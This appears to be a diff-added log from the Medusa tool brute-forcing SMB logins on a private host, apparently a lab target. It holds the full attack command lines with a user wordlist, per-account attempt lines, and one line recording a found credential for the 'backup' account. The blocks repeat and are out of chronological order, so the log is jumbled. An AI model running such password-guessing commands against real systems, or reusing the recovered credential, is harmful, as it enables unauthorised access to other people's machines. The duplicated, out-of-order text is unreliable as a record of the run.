+# Medusa has finished (2026-10-29 15:11:38).
+# Medusa v.2.3 (2026-10-29 15:11:38)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 90ij -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+# Medusa has finished (2026-10-29 15:11:38).
+# Medusa v.2.3 (2026-10-29 15:11:38)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 01kl -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+# Medusa has finished (2026-10-29 15:11:38).
+# Medusa v.2.3 (2026-10-29 15:11:39)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 23mn -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+# Medusa has finished (2026-10-29 15:11:39).
+# Medusa v.2.3 (2026-10-29 15:11:39)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 45op -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+# Medusa has finished (2026-10-29 15:11:39).
+# Medusa v.2.3 (2026-10-29 15:11:40)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 67qr -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+# Medusa has finished (2026-10-29 15:11:40).
+Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+2026-10-29 15:11:40 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: admin (1 of 9, 0 complete) Password: 89st (1 of 1 complete)
+2026-10-29 15:11:40 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: administrator (2 of 9, 1 complete) Password: 89st (1 of 1 complete)
+2026-10-29 15:11:40 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: root (3 of 9, 2 complete) Password: 89st (1 of 1 complete)
+2026-10-29 15:11:40 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: user (4 of 9, 3 complete) Password: 89st (1 of 1 complete)
+2026-10-29 15:11:40 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: test (5 of 9, 4 complete) Password: 89st (1 of 1 complete)
+2026-10-29 15:11:40 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: guest (6 of 9, 5 complete) Password: 89st (1 of 1 complete)
+2026-10-29 15:11:40 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: support (7 of 9, 6 complete) Password: 89st (1 of 1 complete)
+2026-10-29 15:11:40 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: backup (8 of 9, 7 complete) Password: 89st (1 of 1 complete)
+2026-10-29 15:11:40 ACCOUNT CHECK: [smbnt] Host: 172.28.0.12 (1 of 1, 0 complete) User: adm (9 of 9, 8 complete) Password: 89st (1 of 1 complete)
+# Medusa v.2.3 (2026-10-29 15:11:36)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 12ab -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+2026-10-29 15:11:36 ACCOUNT FOUND: [smbnt] Host: 172.28.0.12 User: backup Password: 12ab [SUCCESS (ADMIN$ - Share Unavailable)]
+# Medusa has finished (2026-10-29 15:11:36).
+# Medusa v.2.3 (2026-10-29 15:11:37)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 34cd -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+# Medusa has finished (2026-10-29 15:11:37).
+# Medusa v.2.3 (2026-10-29 15:11:37)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 56ef -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+# Medusa has finished (2026-10-29 15:11:37).
+# Medusa v.2.3 (2026-10-29 15:11:38)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 78gh -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+# Medusa has finished (2026-10-29 15:11:38).
+# Medusa v.2.3 (2026-10-29 15:11:38)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 90ij -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+# Medusa has finished (2026-10-29 15:11:38).
+# Medusa v.2.3 (2026-10-29 15:11:38)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 01kl -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+# Medusa has finished (2026-10-29 15:11:38).
+# Medusa v.2.3 (2026-10-29 15:11:39)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 23mn -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+# Medusa has finished (2026-10-29 15:11:39).
+# Medusa v.2.3 (2026-10-29 15:11:39)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 45op -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+# Medusa has finished (2026-10-29 15:11:39).
+# Medusa v.2.3 (2026-10-29 15:11:40)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 67qr -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+# Medusa has finished (2026-10-29 15:11:40).
+# Medusa v.2.3 (2026-10-29 15:11:40)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 89st -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+# Medusa has finished (2026-10-29 15:11:40).
